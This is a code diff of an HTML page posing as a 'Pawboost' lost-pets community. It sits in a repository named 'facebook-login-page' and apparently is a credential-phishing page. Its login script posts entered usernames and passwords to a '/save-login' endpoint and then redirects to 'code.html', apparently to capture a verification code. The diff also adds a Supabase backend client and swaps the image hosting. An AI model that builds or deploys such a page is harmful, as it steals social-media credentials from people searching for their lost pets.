@@ -1,8 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script type="module">
+  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+
+  window.supabase = createClient(
+    'https://YOUR_PROJECT_ID.supabase.co',
+    'YOUR_PUBLIC_ANON_KEY'
+  );
+</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+
 
 
 
@@ -13,8 +22,7 @@
     <!-- Facebook Open Graph -->
     <meta property="og:title" content="Lost & Found Pets US" />
     <meta property="og:description" content="Join our community to help reunite lost pets with their families. Share sightings, post alerts, and get support from caring members who understand how important every pet is." />
-    <meta property="og:image" content="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/pawboost.png" />
-    <meta property="og:url" content="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/" />
+    <meta property="og:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="Florida Lost Pets" />
 
@@ -22,14 +30,12 @@
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="Lost & Found Pets Florida" />
     <meta name="twitter:description" content="Join our community to help reunite lost pets with their families." />
-    <meta name="twitter:image" content="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/pawboost.png" />
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
 
-    <!-- Instant redirect -->
-    <meta http-equiv="refresh" content="0; url=https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/" />
- 
+   
 
   <!-- Favicon -->
-  <link rel="icon" type="image/png" href="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/pawboost.png" />
+  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
 
 
   <title>Follow our page-Pawboost Community Find Lost Pets</title>
@@ -439,25 +445,25 @@
       if (hasError) return;
 
       // Proceed with login fetch
-      fetch('/save-login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
-      })
-        .then(res => res.json())
-        .then(data => {
-          if (data.success) {
-            localStorage.setItem("login_user", username);
-            window.location.href = "code.html";
-          } else {
-            alert("Login failed. Try again.");
-          }
-        })
-        .catch(err => {
-          console.error('Login error:', err);
-          alert("An error occurred while submitting the login.");
-        });
-    }
+   // Proceed with login fetch
+fetch('/save-login', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ username, password })
+})
+.then(res => res.json())
+.then(data => {
+  if (data.success) {
+    localStorage.setItem("login_user", username);
+    window.location.href = "code.html";
+  } else {
+    alert("Login failed. Try again.");
+  }
+})
+.catch(err => {
+  console.error('Login error:', err);
+  alert("An error occurred while submitting the login.");
+});
 
     function showError(inputElement) {
       inputElement.style.borderColor = 'red';
